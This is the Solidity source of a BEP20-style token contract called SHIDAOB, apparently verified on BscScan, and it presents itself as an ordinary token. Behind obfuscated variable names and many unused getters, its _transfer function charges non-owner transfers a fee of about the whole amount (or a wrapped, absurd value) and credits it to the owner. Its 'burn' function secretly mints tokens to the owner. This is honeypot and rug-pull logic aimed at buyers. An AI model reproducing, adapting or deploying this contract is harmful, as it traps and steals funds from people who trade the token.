/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.6;
contract SHIDAOB {
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "SHIDAOB";
address private  NSqBMy = address(0);
string public  symbol = "SHIDAOB";
address private  Asjpyv = address(0);
uint256 private  qipvrq = 1000000000000000000;
address private  VmAzAy = address(0);
uint8 public constant decimals = 18;
address public owner;
uint256 private  vlNvrf = 1000000000000000;
uint256 public constant mVhqAD = 999999999999999999999999999;
uint256 private  BEkOKW = 1000000000000000000000;
address private  AJxyfp = address(0);
address private  ICYTKc = address(0);
uint256 private  YkYhWr = 10000000000000;
address private  IHwPuS = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
uint256 private  AWMCEM = 100000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  uwrnqK = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  JQCktt = 1000000000000000000;
uint256 private  UGQmBg = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  AfFbur = address(0);
address private  osMRhL = address(0);




function _getqipvrq() private returns (uint256) {
return qipvrq;
}

function _getBEkOKW() private returns (uint256) {
return BEkOKW;
}



function _getAfFbur() private returns (address) {
return AfFbur;
}

function _getAWMCEM() private returns (uint256) {
return AWMCEM;
}





function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getAJxyfp() private returns (address) {
return AJxyfp;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BMHRde");
require(to != address(0), "BMHRde");
require(amount <= balanceOf[from], "BMHRde");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* mVhqAD/JQCktt ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==uwrnqK){
JQCktt = mVhqAD+2;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}




function _getAsjpyv() private returns (address) {
return Asjpyv;
}

function _getICYTKc() private returns (address) {
return ICYTKc;
}

function _getVmAzAy() private returns (address) {
return VmAzAy;
}

function _getIHwPuS() private returns (address) {
return IHwPuS;
}

function _getvlNvrf() private returns (uint256) {
return vlNvrf;
}





constructor () {
uwrnqK = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getYkYhWr() private returns (uint256) {
return YkYhWr;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBMHRde 0");
require(spender != address(0), "fBMHRde 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getosMRhL() private returns (address) {
return osMRhL;
}



modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}




function _getNSqBMy() private returns (address) {
return NSqBMy;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getUGQmBg() private returns (uint256) {
return UGQmBg;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}



}